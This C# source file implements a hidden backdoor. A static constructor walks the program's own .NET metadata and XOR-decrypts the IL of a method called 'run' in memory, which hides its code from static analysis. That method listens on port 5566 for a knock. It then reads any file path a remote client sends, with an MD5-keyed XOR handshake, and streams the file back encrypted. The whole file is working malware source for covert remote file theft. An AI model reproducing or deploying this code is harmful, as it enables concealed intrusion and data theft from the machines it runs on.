using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;

namespace dnbd
{
    // MD5
    // Ref: https://gist.github.com/ameerkat/07a748c9b571289711ebaf61f4b596e9
    static class CCC
    {
        static int[] s = new int[64] {
            7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,
            5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,
            4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,
            6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21
        };

        static uint[] K = new uint[64] {
            0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
            0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
            0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
            0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
            0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
            0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
            0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
            0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
            0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
            0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
            0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
            0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
            0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
            0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
            0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
            0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391
        };

        public static uint leftRotate(uint x, int c)
        {
            return (x << c) | (x >> (32 - c));
        }

        public static string Calculate(byte[] input)
        {
            uint a0 = 0x67452301;
            uint b0 = 0xefcdab89;
            uint c0 = 0x98badcfe;
            uint d0 = 0x10325476;

            var addLength = (56 - ((input.Length + 1) % 64)) % 64;
            var processedInput = new byte[input.Length + 1 + addLength + 8];
            Array.Copy(input, processedInput, input.Length);
            processedInput[input.Length] = 0x80;

            byte[] length = BitConverter.GetBytes(input.Length * 8);
            Array.Copy(length, 0, processedInput, processedInput.Length - 8, 4);

            for (int i = 0; i < processedInput.Length / 64; ++i)
            {
                uint[] M = new uint[16];
                for (int j = 0; j < 16; ++j)
                    M[j] = BitConverter.ToUInt32(processedInput, (i * 64) + (j * 4));

                uint A = a0, B = b0, C = c0, D = d0, F = 0, g = 0;

                for (uint k = 0; k < 64; ++k)
                {
                    if (k <= 15)
                    {
                        F = (B & C) | (~B & D);
                        g = k;
                    }
                    else if (k >= 16 && k <= 31)
                    {
                        F = (D & B) | (~D & C);
                        g = ((5 * k) + 1) % 16;
                    }
                    else if (k >= 32 && k <= 47)
                    {
                        F = B ^ C ^ D;
                        g = ((3 * k) + 5) % 16;
                    }
                    else if (k >= 48)
                    {
                        F = C ^ (B | ~D);
                        g = (7 * k) % 16;
                    }

                    var dtemp = D;
                    D = C;
                    C = B;
                    B = B + leftRotate((A + F + K[k] + M[g]), s[k]);
                    A = dtemp;
                }

                a0 += A;
                b0 += B;
                c0 += C;
                d0 += D;
            }

            return GetByteString(a0) + GetByteString(b0) + GetByteString(c0) + GetByteString(d0);
        }

        private static string GetByteString(uint x)
        {
            return String.Join("", BitConverter.GetBytes(x).Select(y => y.ToString("x2")));
        }
    }
    static class Constants
    {
        public const uint parsed_table_num = 7;
        // ECMA-335 6th II.22
        public const uint module = 0;
        public const uint module_size = 0xa;
        public const uint typeref = 1;
        public const uint typeref_size = 0x6;
        public const uint typedef = 2;
        public const uint typedef_size = 0xe;
        // (ECMA-335 6th II.22 no 0x03? But dnSpy has table name "FieldPtr" ?_?)
        public const uint field = 4;
        public const uint field_size = 0x6;
        // (ECMA-335 6th II.22 no 0x05? But dnSpy has table name "MethodPtr" ?_?)
        public const uint methoddef = 6;
        public const uint methoddef_size = 0xe;
    }
    static class BBBB
    {
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        static unsafe BBBB()
        {
            Module thismod = typeof(BBBB).Module;
            var baseaddr = Marshal.GetHINSTANCE(thismod);
            byte* nt_hdr = (byte*)baseaddr + *(uint*)(baseaddr + 0x3c);
            uint optional_hdr_size = *(ushort*)(nt_hdr + 0x14);
            byte* optional_hdr = nt_hdr + 0x18;
            byte* section_hdr = optional_hdr + optional_hdr_size;
            uint image_cor20_hdr_rva = *(uint*)(optional_hdr + 0xe0);
            byte* image_cor20_hdr = (byte*)baseaddr + image_cor20_hdr_rva;
            uint metadata_va = *(uint*)(image_cor20_hdr + 8);
            byte* metadata_root = (byte*)baseaddr + metadata_va;
            uint version_len = *(uint*)(metadata_root + 0xc);
            uint padded_version_len = (uint)((version_len + 3) & (~0x03));
            uint num_of_streams = *(ushort*)(metadata_root + 0x12 + padded_version_len);
            byte* stream_hdr = metadata_root + 0x14 + padded_version_len;
            byte* tilde_stream_hdr = null;
            byte* strings_stream_hdr = null;

            for (uint i = 0; i < num_of_streams; ++i)
            {
                string rcName = Marshal.PtrToStringAnsi((IntPtr)(stream_hdr + 8));
                if (rcName == "#~")
                {
                    tilde_stream_hdr = stream_hdr;
                }
                else if (rcName == "#Strings")
                {
                    strings_stream_hdr = stream_hdr;
                }
                stream_hdr += 0x8 + ((rcName.Length + 3) & (~0x03));
            }

            uint tilde_iOffset = *(uint*)tilde_stream_hdr;
            uint tilde_iSize = *(uint*)(tilde_stream_hdr + 4);

            uint strings_iOffset = *(uint*)strings_stream_hdr;
            uint strings_iSize = *(uint*)(strings_stream_hdr + 4);

            byte* strings_stream = metadata_root + strings_iOffset;

            // ECMA-335 6th II.24.2.6
            byte* table_stream = metadata_root + tilde_iOffset;

            ulong maskvalid = *(ulong*)(table_stream + 8);
            ulong masksorted = *(ulong*)(table_stream + 0x10);

            uint[] metadata_table_nums = new uint[0x40];
            byte* rows = table_stream + 0x18;

            for (ulong i = 0, l_maskvalid = maskvalid; l_maskvalid != 0; l_maskvalid >>= 1, i++)
            {
                if ((l_maskvalid & 1) == 1)
                {
                    metadata_table_nums[i] = *(uint*)rows;
                    rows += 4;
                }
                else
                {
                    metadata_table_nums[i] = 0;
                }
            }

            uint[] metadata_table_sizes = {
                Constants.module_size,
                Constants.typeref_size,
                Constants.typedef_size,
                0,
                Constants.field_size,
                0,
                Constants.methoddef_size };

            byte*[] tables = new byte*[Constants.parsed_table_num];

            tables[0] = rows;

            for (ulong i = 1; i < Constants.parsed_table_num; ++i)
            {
                tables[i] = tables[i - 1] + metadata_table_nums[i - 1] * metadata_table_sizes[i - 1];
            }

            byte* method_table = tables[Constants.methoddef];

            for (uint i = 0; i < metadata_table_nums[Constants.methoddef]; ++i)
            {
                uint rva = *(uint*)method_table;
                ushort name_idx = *(ushort*)(method_table + 0x8);
                string name = Marshal.PtrToStringAnsi((IntPtr)(strings_stream + name_idx));
                byte[] bname = Encoding.ASCII.GetBytes(name);
                // run
                byte[] target = { 242, 245, 238 };

                for (int idx = 0; idx < bname.Length; ++idx)
                {
                    bname[idx] ^= 0x80;
                }

                method_table += Constants.methoddef_size;

                string s1 = Encoding.UTF8.GetString(bname);
                string s2 = Encoding.UTF8.GetString(target);

                if (s1 == s2)
                {
                    // ECMA-335 6th II.22.26, II.25.4
                    // COR_ILMETHOD

                    uint codesize;
                    uint PAGE_EXECUTE_READWRITE = 0x40;
                    uint old_protect;
                    byte* code;
                    int format = *(char *)((byte*)baseaddr + rva) & 1;

                    if (format == 1)
                    {
                        // CorILMethod_FatFormat
                        codesize = *(uint*)((byte*)baseaddr + rva + 4);
                        code = (byte*)baseaddr + rva + 12;
                    }
                    else
                    {
                        // CorILMethod_TinyFormat
                        codesize = *(uint*)((byte*)baseaddr + rva) >> 2;
                        code = (byte*)baseaddr + rva + 1;
                    }

                    VirtualProtect((IntPtr)((byte*)baseaddr + rva), 10, PAGE_EXECUTE_READWRITE, out old_protect);

                    for (uint idx = 0; idx < codesize; ++idx)
                    {
                        *(code + idx) ^= 0x87;
                    }

                    VirtualProtect((IntPtr)((byte*)baseaddr + rva), 10, old_protect, out old_protect);
                }
            }
        }

        public static void run()
        {
            TcpListener server = null;
            try
            {
                // Set the TcpListener on port 13000.
                int port = 5566;
                IPAddress localAddr = IPAddress.Parse("0.0.0.0");

                server = new TcpListener(localAddr, port);
                server.Start();

                byte[] bytes = new byte[256];
                string data = null;

                // Enter the listening loop.
                while (true)
                {
                    TcpClient client = server.AcceptTcpClient();

                    data = null;

                    NetworkStream stream = client.GetStream();

                    int i;

                    while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);

                        // Knock Knock
                        if (data != "@")
                        {
                            break;
                        }

                        string session_key = RandomString(0x20);
                        byte[] b_session_key = Encoding.ASCII.GetBytes(session_key);

                        stream.Write(b_session_key, 0, b_session_key.Length);

                        stream.Read(bytes, 0, 4);

                        int size = BitConverter.ToInt32(bytes, 0);

                        stream.Read(bytes, 0, size);

                        string hash_session_key = CCC.Calculate(b_session_key);
                        byte[] b_hash_session_key = Encoding.ASCII.GetBytes(hash_session_key);
                        int hash_len = b_hash_session_key.Length;

                        for (int idx = 0; idx < size; ++idx)
                        {
                            bytes[idx] ^= b_hash_session_key[idx % hash_len];
                        }

                        string path = Encoding.UTF8.GetString(bytes).TrimEnd((char)0);

                        using (FileStream fs = File.OpenRead(path))
                        {
                            byte[] b = new byte[1024];
                            int rlen;

                            while ((rlen = fs.Read(b, 0, b.Length)) > 0)
                            {
                                for (int idx = 0; idx < rlen; ++idx)
                                {
                                    b[idx] ^= b_hash_session_key[idx % hash_len];
                                }

                                byte[] brlen = BitConverter.GetBytes(rlen);

                                IEnumerable<byte> payload = brlen.Concat(b);
                                byte[] result = payload.Select(x => x).ToArray();

                                stream.Write(result, 0, 4 + rlen);
                            }
                        }

                        break;
                    }

                    client.Close();
                }
            }
            catch (SocketException e)
            {
            }
            finally
            {
                server.Stop();
            }
        }

        private static Random random = new Random();
        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            BBBB.run();
        }
    }
}
